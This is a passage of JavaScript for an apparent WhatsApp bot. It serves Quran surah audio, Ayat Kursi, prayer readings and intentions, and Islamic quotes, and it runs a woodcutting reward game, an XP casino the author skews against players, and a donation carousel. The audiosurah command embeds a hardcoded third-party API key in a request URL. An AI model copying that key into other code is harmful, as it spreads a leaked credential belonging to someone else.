    replyviex(`${contoh} + ${data} + ${anjuran}`)
}
break
//=========================================\\
case 'audiosurah': {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return replyviex(`${wrong}`)
      TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
   TradzSigma.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break
//=========================================\\

case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  replyviex(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    replyviex(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replyviex(`${caption}`)

}
break
//=========================================\\
case 'assalamualaikum': 
case 'assalamualaikum wr. wb.': 
case 'assalamualaikum wr wb': {
    let caption = `*Waalaikummussalam warahmatullahi wabarokatuh*


_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh” atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT"
`.trim()
    replyviex(`${caption}`)
}
break
//=========================================\\
case 'niatsholat': {
    if (!q) return replyviex(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return replyviex(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    replyviex(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    replyviex(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replyviex(`${caption}`)
}
break
//=========================================\\
case 'nebang': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

    return hours + " jam " + minutes + " menit " + seconds + " detik"
}
	  let user = global.db.users[m.sender]
    let time = user.lastparming + 1800000
    if (new Date - user.lastparming < 1800000) return replyviex(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
	let wood = `${Math.floor(Math.random() * 50)}`.trim()
	let money = `${Math.floor(Math.random() * 50000)}`.trim()
	user.wood += wood * 1
	user.money += money * 1
	user.lastparming = new Date * 1
    replyviex(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break
//=========================================\\
case 'casino': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
let buatall = 1
    TradzSigma.casino = TradzSigma.casino ? TradzSigma.casino : {}
    if (m.chat in TradzSigma.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
    else TradzSigma.casino[m.chat] = true
    try {
        let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
        let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
        let Aku = (randomaku * 1)
        let Kamu = (randomkamu * 1)
        let count = args[0]
        count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
        count = Math.max(1, count)
        if (args.length < 1) return reply('casino <jumlah>\n ' + 'casino 1000', )
        if (global.db.users[m.sender].exp >= count * 1) {
            global.db.users[m.sender].exp -= count * 1
            //await reply('') //Kwkwwkkwlwlw
            if (Aku > Kamu) {
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nKamu kehilangan ${count} Uang(xp)`)
            } else if (Aku < Kamu) {
                global.db.users[m.sender].exp += count * 2
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nKamu mendapatkan ${count * 2} Uang(xp)`)
            } else {
                global.db.users[m.sender].exp += count * 1
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*SERI*\nKamu mendapatkan ${count * 1} Uang(xp)`)
            }
        } else reply(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
    } catch (e) {
        console.log(e)
        reply('Error!!')
        if (DevMode) {
            for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != TradzSigma.user.jid)) {
                TradzSigma.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
            }
        }
    } finally {
        delete TradzSigma.casino[m.chat]
    }
}
break
//=========================================\\
case 'donate':
case 'pay':
case 'donasi':
case 'payment': {
  await TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
  const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: TradzSigma.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Berikut daftar metode pembayaran saya ya~`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './library/data/image/payment/dana.jpg' } }, { upload: TradzSigma.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol DANA di bawah\n> DANA A/N: ${global.andana}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"id\":\"123456789\",\"copy_code\":\"${global.nodana}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './library/data/image/payment/gopay.jpg' } }, { upload: TradzSigma.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol GOPAY di bawah\n> GOPAY A/N: ${global.angopay}` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"id\":\"123456789\",\"copy_code\":\"${global.nogopay}\"}`
                      },
                    ],
                  },
                },
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './library/data/image/payment/qris.jpg' } }, { upload: TradzSigma.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> SCAN di atas / klik tombol` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_url",
